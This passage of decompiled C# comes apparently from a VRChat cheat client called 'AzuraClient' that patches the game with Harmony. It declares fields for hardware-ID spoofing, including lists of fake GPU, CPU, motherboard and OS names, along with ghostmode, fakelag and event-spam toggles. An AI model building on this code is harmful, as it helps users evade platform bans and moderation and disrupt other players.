						Utilities.uia1.gameObject.transform.Find("Image/Text (TMP)").gameObject.GetComponent<TextMeshProUGUI>().text = "<color=yellow>Friend Left: [" + __0._vrcplayer.DisplayName() + "]</color>";
						Utilities.uia1.SetActive(false);
						Utilities.uia1.SetActive(true);
					}
				}
				Logs.Log("Player Left: [" + __0._vrcplayer.DisplayName() + "]", true);
			}
			catch
			{
			}
		}

		// Token: 0x04000163 RID: 355
		public static readonly Harmony Instance = new Harmony("AzuraClient-UwU-" + Guid.NewGuid().ToString());

		// Token: 0x04000164 RID: 356
		private static int SuccessfulPatches = 0;

		// Token: 0x04000165 RID: 357
		public static byte LastReceivedEvent;

		// Token: 0x04000166 RID: 358
		public static int AmountOfSpam = 0;

		// Token: 0x04000167 RID: 359
		private static bool finishedpatches;

		// Token: 0x04000168 RID: 360
		private static bool finishedpatches1;

		// Token: 0x04000169 RID: 361
		public static string[] blacklistShaders;

		// Token: 0x0400016A RID: 362
		public static string[] blacklistMesh;

		// Token: 0x0400016B RID: 363
		public static int maxAudio;

		// Token: 0x0400016C RID: 364
		public static int maxLight;

		// Token: 0x0400016D RID: 365
		public static int maxDynamicBonesCollider;

		// Token: 0x0400016E RID: 366
		public static int maxPoly;

		// Token: 0x0400016F RID: 367
		public static int maxMatirial;

		// Token: 0x04000170 RID: 368
		public static int maxCloth;

		// Token: 0x04000171 RID: 369
		public static int maxColliders;

		// Token: 0x04000172 RID: 370
		public static Shader defaultShader;

		// Token: 0x04000173 RID: 371
		public static List<OnAssetBundleLoadEvent> OnAssetBundleLoadEventArray = new List<OnAssetBundleLoadEvent>();

		// Token: 0x04000174 RID: 372
		private static string newHWID = "";

		// Token: 0x04000175 RID: 373
		private static string[] PBU = new string[]
		{
			"MSI Radeon RX 6900 XT GAMING Z TRIO 16GB",
			"Gigabyte Radeon RX 6700 XT Gaming OC 12GB",
			"ASUS DUAL GeForce RTX 2060 6GB OC EVO",
			"Palit GeForce GTX 1050 Ti StormX 4GB",
			"MSI GeForce GTX 1650 D6 Ventus XS OCV2 12GB OC",
			"ASUS GOLD20TH GTX 980 Ti Platinum",
			"ASUS TUF GeForce RTX 3060 12GB OC Gaming",
			"NVIDIA Quadro RTX 4000 8GB",
			"NVIDIA GeForce GTX 1080 Ti",
			"NVIDIA GeForce GTX 1080",
			"NVIDIA GeForce GTX 1070",
			"NVIDIA GeForce GTX 1060 6GB",
			"NVIDIA GeForce GTX 980 Ti"
		};

		// Token: 0x04000176 RID: 374
		private static string[] CPU = new string[]
		{
			"AMD Ryzen 5 3600",
			"AMD Ryzen 7 3700X",
			"AMD Ryzen 7 5800X",
			"AMD Ryzen 9 5900X",
			"AMD Ryzen 9 3900X 12-Core Processor",
			"INTEL CORE I9-10900K",
			"INTEL CORE I7-10700K",
			"INTEL CORE I9-9900K",
			"Intel Core i7-8700K"
		};

		// Token: 0x04000177 RID: 375
		private static string[] Motherboards = new string[]
		{
			"B550 AORUS PRO (Gigabyte Technology Co., Ltd.)",
			"Gigabyte B450M DS3H",
			"Asus AM4 TUF Gaming X570-Plus",
			"ASRock Z370 Taichi"
		};

		// Token: 0x04000178 RID: 376
		private static string[] OS = new string[]
		{
			"Windows 10  (10.0.0) 64bit",
			"Windows 10  (10.0.0) 32bit",
			"Windows 8  (10.0.0) 64bit",
			"Windows 8  (10.0.0) 32bit",
			"Windows 7  (10.0.0) 64bit",
			"Windows 7  (10.0.0) 32bit",
			"Windows Vista 64bit",
			"Windows Vista 32bit",
			"Windows XP 64bit",
			"Windows XP 32bit"
		};

		// Token: 0x04000179 RID: 377
		public static bool ghostmode;

		// Token: 0x0400017A RID: 378
		public static bool fakelag;

		// Token: 0x0400017B RID: 379
		private static int fakelagnumb;

		// Token: 0x0400017C RID: 380
		private static int fakevc;

		// Token: 0x0400017D RID: 381
		public static string WORLDID = "wrld_858dfdfc-1b48-4e1e-8a43-f0edc611e5fe";

		// Token: 0x0400017E RID: 382
		internal static List<byte> BlacklistedEvents = new List<byte>();
	}
}
